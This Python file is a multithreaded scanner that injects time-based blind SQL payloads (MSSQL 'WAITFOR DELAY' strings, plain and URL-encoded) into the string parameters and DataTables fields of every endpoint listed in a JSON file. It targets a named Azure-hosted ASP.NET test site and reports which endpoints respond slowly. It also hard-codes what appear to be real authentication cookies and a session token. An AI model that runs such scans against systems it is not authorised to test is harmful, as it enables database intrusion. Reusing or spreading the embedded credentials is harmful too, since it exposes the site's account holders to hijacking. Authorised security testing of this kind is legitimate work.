import json
import requests
import time
from datetime import datetime
from typing import Dict, List, Any, Tuple
import urllib3
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import queue

# ==================== GLOBAL CONFIGURATION ====================
BASE_URL = "https://fundsq-degroof-test.azurewebsites.net"
DEFAULT_STRING_VALUE = "test_value"
DEFAULT_INT_VALUE = 0
DEFAULT_BOOL_VALUE = False
DEFAULT_FLOAT_VALUE = 0.0

# Parallel processing configuration
MAX_WORKERS = 10  # Number of parallel threads
BATCH_SIZE = 50   # Number of endpoints to process in each batch
REQUEST_DELAY = 0.1  # Delay between requests in seconds (rate limiting)

# SQL Injection Payloads - Time-based blind SQL injection for MSSQL
SQL_INJECTION_PAYLOADS = [
    "';WAITFOR DELAY '0:0:10'--",
    "';WAITFOR DELAY '0:0:15'--",
    "' OR '1'='1';WAITFOR DELAY '0:0:10'--",
    "1';WAITFOR DELAY '0:0:10'--",
    "admin';WAITFOR DELAY '0:0:10'--",
]

# URL-encoded versions (for query parameters)
SQL_INJECTION_PAYLOADS_ENCODED = [
    "%27%3bWAITFOR%20DELAY%20%270%3a0%3a10%27--",
    "%27%3bWAITFOR%20DELAY%20%270%3a0%3a15%27--",
    "%27%20OR%20%271%27%3d%271%27%3bWAITFOR%20DELAY%20%270%3a0%3a10%27--",
    "1%27%3bWAITFOR%20DELAY%20%270%3a0%3a10%27--",
    "admin%27%3bWAITFOR%20DELAY%20%270%3a0%3a10%27--",
]

# jQuery DataTables fields that could be vulnerable
DATATABLE_INJECTABLE_FIELDS = [
    "mDataProp_0", "mDataProp_1", "mDataProp_2", "mDataProp_3", 
    "mDataProp_4", "mDataProp_5", "mDataProp_6",
    "sColumns", "sSortDir_0", "searchData"
]

# Expected delay threshold (in seconds)
DELAY_THRESHOLD = 8.0  # If response takes > 8 seconds for a 10-second payload, likely vulnerable

# Headers et cookies extraits de votre requête curl
HEADERS = {
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9,ml;q=0.8",
    "connection": "keep-alive",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "content-length": "4",
    "origin": "https://fundsq-degroof-test.azurewebsites.net",
    "host": "fundsq-degroof-test.azurewebsites.net",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"'
}

COOKIES = {
    "ext_name": "ojplmecpdpgccookcobabopnaifgidhf",
    "__RequestVerificationToken": "nJSuzb0n01OdX9lHcSekGaAeGbuQV9Zo7AZ6Qy8wrppq35A-Yc9MbzNfP3BN8USn5gg7M9WhZvxiGd6GQEA9l_C0cvJE5-hUxVfuLt2hK_Q1",
    "ARRAffinity": "b75e77002ba89b7b27787cb1e27fb03824cd4882728e9d3f98d0a753614ce3a1",
    "ARRAffinitySameSite": "b75e77002ba89b7b27787cb1e27fb03824cd4882728e9d3f98d0a753614ce3a1",
    "TranslationCulture": "ENG",
    "Sidebar": "false",
    ".AspNet.ApplicationCookie": "0jBNSuGlRVSDc-3lSE2iJxIWxRX35oiyrjJ4dlalBLi9upvrM-un7amtqTGan1zlpOBpfsKWKEqHawdCovPks4P7Ltyo6w7Xpxt4LomaEH-TWscRG2dZCLooRPaWEv2ztQEQxFkSeCv8CG9msiS8SlzkZzELdL-f6fF726Pk9_rRl8_XEhSCscOtx_iBdvdNQ-bezjdbTi6cNaODrwH-wau55zloFUSlpV4cysJVE3D-z-Ox5YRUu1c2F_-t7TkDidGMgNFR5_eaGk65eV46fh83febSgxGnXecXs77_m4ePgWa7uxUEdBAentD6Dn7s3YGRfMdvvaKrEzC1DFxkjgK7qEHeHmxqfZsB7A9ZwZcoqahXRy2fgO_1VRL2BiCQb5Q0aDiMHkb68Z3q7wpnEagSYbtMREoyxQyQ_a57uf5gKw-2j09EfIE1sQUz_zCL1b8MwBtTg8pi4gux9Es4mPJ-fIYYaKAmddGROV8QF9VfAPH-0W_F10TKSovWoed-SzcDvqtz_N8z89Q9HIGGmg",
    ".ASPXAUTH": "AF2467A4720CC0BB3CBB3EEC9E3304B6BCE9A0CE391FDD52106963BF9C89051B072AE491586B09E7BE938E072FC0F81835518B1D350BAA25166E9B9356143ABF86B6026DA0FFA72BEB4C182D1DCB85D20C3C996263179E78ED1B4E5402FC18589A5B256702A7BD00778C4C911B7B3E4378CB9DFD5F29D641B57CF13010111192ABC07421F9C53525CAF7DAC759F38E41",
    "RememberMeLoginCookie": "uname=xIeo5d2HZQiT8w/C9dnKeuUq0SHAoNfhGcfjbdRnE+ttctwr6tGf1k9ab47AmScDlWVscz0OLAFtKpgTE5T+pQ==",
    "idleTimer": "%7B%22idleTime%22%3A%220%22%2C%22updatedTime%22%3A%22Mon%20Dec%2022%202025%2012%3A51%3A20%20GMT%2B0530%20(India%20Standard%20Time)%22%7D"
}

# Input and output files
INPUT_JSON_FILE = "endpoints.json"

# Thread-safe counter and lock
progress_lock = Lock()
progress_counter = {"completed": 0, "vulnerable": 0, "total": 0}

# ==================== UTILITY FUNCTIONS ====================

def get_default_value_for_type(param_type: str, is_simple: bool) -> Any:
    """Returns a default value based on parameter type"""
    if not is_simple:
        return None
    
    param_type_lower = param_type.lower()
    
    if any(t in param_type_lower for t in ['int', 'int32', 'int64', 'short', 'long', 'byte']):
        return DEFAULT_INT_VALUE
    
    if any(t in param_type_lower for t in ['float', 'double', 'decimal']):
        return DEFAULT_FLOAT_VALUE
    
    if 'bool' in param_type_lower:
        return DEFAULT_BOOL_VALUE
    
    return DEFAULT_STRING_VALUE


def build_request_params(parameters: List[Dict]) -> Dict[str, Any]:
    """Builds request parameters"""
    params = {}
    for param in parameters:
        param_name = param.get("Name", "")
        param_type = param.get("Type", "String")
        is_simple = param.get("IsSimpleType", True)
        
        value = get_default_value_for_type(param_type, is_simple)
        if value is not None:
            params[param_name] = value
    
    return params


def get_string_parameters(parameters: List[Dict]) -> List[str]:
    """Returns list of string-type parameters"""
    string_params = []
    for param in parameters:
        param_type = param.get("Type", "String").lower()
        is_simple = param.get("IsSimpleType", True)
        
        if is_simple and 'string' in param_type:
            string_params.append(param.get("Name", ""))
    
    return string_params


def has_datatable_model(parameters: List[Dict]) -> bool:
    """Check if endpoint uses jQuery DataTables model"""
    for param in parameters:
        param_type = param.get("Type", "")
        if "JQueryDataTablesModel" in param_type or "DataTables" in param_type:
            return True
    return False


def build_datatable_params(searchdata_value: str = "") -> Dict[str, Any]:
    """Build a complete jQuery DataTables POST request"""
    return {
        "sEcho": "1",
        "iColumns": "7",
        "sColumns": ",,,,,",
        "iDisplayStart": "0",
        "iDisplayLength": "10",
        "mDataProp_0": "DocumentFileName",
        "bSortable_0": "true",
        "mDataProp_1": "SectionName",
        "bSortable_1": "true",
        "mDataProp_2": "QuestionText",
        "bSortable_2": "false",
        "mDataProp_3": "UploadedBy",
        "bSortable_3": "true",
        "mDataProp_4": "UploadDateString",
        "bSortable_4": "true",
        "mDataProp_5": "Id",
        "bSortable_5": "false",
        "mDataProp_6": "Id",
        "bSortable_6": "false",
        "iSortCol_0": "0",
        "sSortDir_0": "desc",
        "iSortingCols": "1",
        "searchData": searchdata_value or '{"UniqueGUID":"A6867CF0-9ADD-425F-A221-76B0ADAE0445"}'
    }


def should_skip_endpoint(parameters: List[Dict], skip_searchdata: bool = True) -> Tuple[bool, str]:
    """Check if endpoint should be skipped"""
    if not skip_searchdata:
        return False, ""
    
    excluded_param_names = ["searchData"]
    
    for param in parameters:
        param_name = param.get("Name", "")
        if param_name in excluded_param_names:
            return True, f"Parameter '{param_name}' found - endpoint skipped"
    
    return False, ""


def test_baseline_response_time(url: str, http_method: str, params: Dict[str, Any]) -> Tuple[float, bool]:
    """
    Tests baseline response time (without injection) to establish a reference
    Returns (average_time, success)
    """
    times = []
    
    for i in range(2):  # Make 2 requests to get an average
        try:
            time.sleep(REQUEST_DELAY)  # Rate limiting
            start_time = time.time()
            
            if http_method.upper() == "GET":
                response = requests.get(url, params=params, headers=HEADERS, cookies=COOKIES, 
                                       verify=True, timeout=30)
            elif http_method.upper() == "POST":
                response = requests.post(url, data=params, headers=HEADERS, cookies=COOKIES, 
                                        verify=True, timeout=30)
            else:
                return 0.0, False
            
            end_time = time.time()
            response_time = end_time - start_time
            times.append(response_time)
            
        except Exception as e:
            return 0.0, False
    
    avg_time = sum(times) / len(times) if times else 0.0
    return avg_time, True


def update_progress(total: int, has_vulnerability: bool = False):
    """Thread-safe progress update"""
    with progress_lock:
        progress_counter["completed"] += 1
        if has_vulnerability:
            progress_counter["vulnerable"] += 1
        
        completed = progress_counter["completed"]
        vulnerable = progress_counter["vulnerable"]
        percentage = (completed / total) * 100
        
        print(f"\rProgress: {completed}/{total} ({percentage:.1f}%) | Vulnerable: {vulnerable}", end="", flush=True)


def test_sql_injection(endpoint: Dict, endpoint_index: int, total_endpoints: int, 
                       use_encoded: bool = False, skip_searchdata: bool = True, 
                       verbose: bool = False) -> Dict[str, Any]:
    """
    Tests an endpoint for time-based SQL injection (thread-safe version)
    """
    route = endpoint.get("Route", "")
    http_verbs = endpoint.get("HttpVerbs", ["GET"])
    parameters = endpoint.get("Parameters", [])
    
    url = f"{BASE_URL}{route}"
    
    # Check if endpoint should be skipped (only if not DataTables)
    is_datatable = has_datatable_model(parameters)
    
    if not is_datatable:
        should_skip, skip_reason = should_skip_endpoint(parameters, skip_searchdata)
        if should_skip:
            update_progress(total_endpoints)
            return {
                "endpoint": route,
                "skipped": True,
                "skip_reason": skip_reason
            }
    
    # Determine what to test
    if is_datatable:
        test_fields = DATATABLE_INJECTABLE_FIELDS
        base_params = build_datatable_params()
        if verbose:
            print(f"\n[{endpoint_index}/{total_endpoints}] Testing DataTables: {route}")
    else:
        test_fields = get_string_parameters(parameters)
        if not test_fields:
            update_progress(total_endpoints)
            return {
                "endpoint": route,
                "skipped": True,
                "skip_reason": "No string parameters found"
            }
        base_params = build_request_params(parameters)
        if verbose:
            print(f"\n[{endpoint_index}/{total_endpoints}] Testing: {route}")
    
    http_method = "POST" if is_datatable else (http_verbs[0] if http_verbs else "GET")
    
    # Establish baseline response time
    baseline_time, baseline_success = test_baseline_response_time(url, http_method, base_params)
    
    if not baseline_success:
        update_progress(total_endpoints)
        return {
            "endpoint": route,
            "skipped": True,
            "skip_reason": "Unable to establish baseline"
        }
    
    # Test results
    results = {
        "endpoint": route,
        "controller": endpoint.get("Controller", ""),
        "action": endpoint.get("Action", ""),
        "http_method": http_method,
        "is_datatable": is_datatable,
        "baseline_time": round(baseline_time, 2),
        "timestamp": datetime.now().isoformat(),
        "skipped": False,
        "vulnerabilities": []
    }
    
    # Choose appropriate payloads
    payloads = SQL_INJECTION_PAYLOADS_ENCODED if use_encoded else SQL_INJECTION_PAYLOADS
    
    # Test each field with each payload
    for field_name in test_fields:
        for payload in payloads:
            # Extract expected delay from payload
            expected_delay = 10.0
            if "'0:0:15'" in payload or "'0%3a0%3a15'" in payload:
                expected_delay = 15.0
            
            # Create a copy of parameters and inject the payload
            test_params = base_params.copy()
            test_params[field_name] = payload
            
            try:
                time.sleep(REQUEST_DELAY)  # Rate limiting
                start_time = time.time()
                
                if http_method.upper() == "GET":
                    response = requests.get(url, params=test_params, headers=HEADERS, 
                                          cookies=COOKIES, verify=True, timeout=60)
                elif http_method.upper() == "POST":
                    response = requests.post(url, data=test_params, headers=HEADERS, 
                                           cookies=COOKIES, verify=True, timeout=60)
                else:
                    continue
                
                end_time = time.time()
                response_time = end_time - start_time
                time_difference = response_time - baseline_time
                
                # If response time exceeds threshold, potentially vulnerable
                if time_difference >= DELAY_THRESHOLD:
                    vulnerability = {
                        "parameter": field_name,
                        "payload": payload,
                        "response_time": round(response_time, 2),
                        "baseline_time": round(baseline_time, 2),
                        "time_difference": round(time_difference, 2),
                        "expected_delay": expected_delay,
                        "status_code": response.status_code,
                        "vulnerable": True
                    }
                    results["vulnerabilities"].append(vulnerability)
                    if verbose:
                        print(f"\n  🚨 VULNERABLE: {route} - {field_name}")
                
            except requests.exceptions.Timeout:
                vulnerability = {
                    "parameter": field_name,
                    "payload": payload,
                    "response_time": ">60",
                    "baseline_time": round(baseline_time, 2),
                    "time_difference": ">60",
                    "expected_delay": expected_delay,
                    "status_code": "Timeout",
                    "vulnerable": True
                }
                results["vulnerabilities"].append(vulnerability)
                if verbose:
                    print(f"\n  🚨 TIMEOUT: {route} - {field_name}")
            except Exception as e:
                if verbose:
                    print(f"\n  ✗ Error on {route}: {str(e)[:50]}")
    
    has_vuln = len(results["vulnerabilities"]) > 0
    update_progress(total_endpoints, has_vuln)
    
    return results


def process_batch(endpoints_batch: List[Tuple[Dict, int]], total_endpoints: int, 
                  use_encoded: bool, skip_searchdata: bool, verbose: bool, 
                  max_workers: int) -> List[Dict]:
    """Process a batch of endpoints in parallel"""
    results = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_endpoint = {
            executor.submit(
                test_sql_injection, 
                endpoint, 
                idx, 
                total_endpoints, 
                use_encoded, 
                skip_searchdata,
                verbose
            ): (endpoint, idx)
            for endpoint, idx in endpoints_batch
        }
        
        for future in as_completed(future_to_endpoint):
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                endpoint, idx = future_to_endpoint[future]
                print(f"\n✗ Exception processing endpoint {idx}: {str(e)[:100]}")
                results.append({
                    "endpoint": endpoint.get("Route", "N/A"),
                    "skipped": True,
                    "skip_reason": f"Exception: {str(e)[:100]}"
                })
    
    return results


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Parallel SQL Injection time-based testing on ASP.NET endpoints')
    parser.add_argument('--start', type=int, default=0, help='Start index')
    parser.add_argument('--end', type=int, default=None, help='End index')
    parser.add_argument('--limit', type=int, default=None, help='Maximum number of endpoints')
    parser.add_argument('--controller', type=str, default=None, help='Filter by controller')
    parser.add_argument('--use-encoded', action='store_true', 
                       help='Use URL-encoded payloads')
    parser.add_argument('--test-searchdata', action='store_true', 
                       help='Include endpoints with searchData parameter (normally skipped)')
    parser.add_argument('--input', type=str, default=INPUT_JSON_FILE, 
                       help=f'Input JSON file (default: {INPUT_JSON_FILE})')
    parser.add_argument('--workers', type=int, default=MAX_WORKERS,
                       help=f'Number of parallel workers (default: {MAX_WORKERS})')
    parser.add_argument('--batch-size', type=int, default=BATCH_SIZE,
                       help=f'Batch size for processing (default: {BATCH_SIZE})')
    parser.add_argument('--verbose', action='store_true',
                       help='Enable verbose output (shows individual endpoint progress)')
    parser.add_argument('--delay', type=float, default=REQUEST_DELAY,
                       help=f'Delay between requests in seconds (default: {REQUEST_DELAY})')
    
    args = parser.parse_args()
    
    # Use local variables instead of modifying globals
    max_workers = args.workers
    batch_size = args.batch_size
    request_delay = args.delay
    
    print(f"\n{'='*80}")
    print(f"PARALLEL SQL INJECTION TESTING - Time-Based Blind SQL Injection (MSSQL)")
    print(f"{'='*80}")
    print(f"Base URL: {BASE_URL}")
    print(f"Input file: {args.input}")
    print(f"Payloads: {'URL-encoded' if args.use_encoded else 'Standard'}")
    print(f"Detection threshold: {DELAY_THRESHOLD}s")
    print(f"Skip searchData: {'No' if args.test_searchdata else 'Yes'}")
    print(f"Parallel workers: {max_workers}")
    print(f"Batch size: {batch_size}")
    print(f"Request delay: {request_delay}s")
    print(f"{'='*80}\n")
    
    # Load endpoints
    try:
        with open(args.input, 'r', encoding='utf-8') as f:
            endpoints = json.load(f)
        print(f"✓ {len(endpoints)} endpoints loaded\n")
    except FileNotFoundError:
        print(f"✗ Error: File '{args.input}' does not exist")
        return
    except json.JSONDecodeError as e:
        print(f"✗ Error: Invalid JSON file - {e}")
        return
    
    # Filter by controller
    if args.controller:
        endpoints = [ep for ep in endpoints if ep.get("Controller", "").lower() == args.controller.lower()]
        print(f"✓ Filtered by controller '{args.controller}': {len(endpoints)} endpoints\n")
    
    # Apply limits
    start_idx = args.start
    if args.end is not None:
        end_idx = min(args.end, len(endpoints))
    elif args.limit is not None:
        end_idx = min(start_idx + args.limit, len(endpoints))
    else:
        end_idx = len(endpoints)
    
    endpoints_to_test = endpoints[start_idx:end_idx]
    total_endpoints = len(endpoints_to_test)
    
    print(f"✓ Testing {total_endpoints} endpoints (index {start_idx} to {end_idx-1})")
    print(f"✓ Estimated time: {(total_endpoints * 5 * 2) / MAX_WORKERS / 60:.1f} minutes (approximate)\n")
    
    # Initialize progress counter
    progress_counter["total"] = total_endpoints
    progress_counter["completed"] = 0
    progress_counter["vulnerable"] = 0
    
    output_file = f"sqli_results_{start_idx}_{end_idx}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    # Process in batches
    all_results = []
    start_time = time.time()
    
    print(f"Starting parallel processing...\n")
    
    for batch_start in range(0, total_endpoints, batch_size):
        batch_end = min(batch_start + batch_size, total_endpoints)
        batch = [(endpoints_to_test[i], start_idx + batch_start + i + 1) 
                 for i in range(batch_end - batch_start)]
        
        batch_results = process_batch(
            batch, 
            total_endpoints, 
            args.use_encoded, 
            not args.test_searchdata,
            args.verbose,
            max_workers
        )
        
        all_results.extend(batch_results)
        
        # Save intermediate results after each batch
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(all_results, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"\n⚠ Warning: Could not save intermediate results: {e}")
    
    end_time = time.time()
    total_time = end_time - start_time
    
    print(f"\n\n{'='*80}")
    print(f"✓ All processing completed in {total_time/60:.2f} minutes")
    print(f"✓ Results saved to '{output_file}'")
    
    # Final statistics
    total = len(all_results)
    skipped = sum(1 for r in all_results if r.get("skipped"))
    tested = total - skipped
    vulnerable_count = sum(1 for r in all_results if not r.get("skipped") and r.get("vulnerabilities"))
    
    print(f"\n{'='*80}")
    print(f"SQL INJECTION TEST SUMMARY")
    print(f"{'='*80}")
    print(f"Total endpoints processed: {total}")
    print(f"Endpoints tested: {tested}")
    print(f"Endpoints skipped: {skipped}")
    print(f"VULNERABLE endpoints: {vulnerable_count}")
    print(f"Vulnerability rate: {vulnerable_count/tested*100:.1f}%" if tested > 0 else "N/A")
    print(f"Average time per endpoint: {total_time/total:.2f}s")
    print(f"Throughput: {total/(total_time/60):.1f} endpoints/minute")
    print(f"{'='*80}\n")
    
    # Display found vulnerabilities
    if vulnerable_count > 0:
        print(f"\n🚨 VULNERABILITIES DETECTED:")
        print(f"{'='*80}")
        for result in all_results:
            if result.get("vulnerabilities"):
                print(f"\nEndpoint: {result['endpoint']}")
                print(f"Method: {result.get('http_method', 'N/A')}")
                for vuln in result['vulnerabilities']:
                    print(f"  → Parameter: {vuln['parameter']}")
                    print(f"    Payload: {vuln['payload'][:60]}...")
                    print(f"    Observed delay: {vuln['time_difference']}s (expected: ~{vuln['expected_delay']}s)")
        print(f"{'='*80}\n")


if __name__ == "__main__":
    main()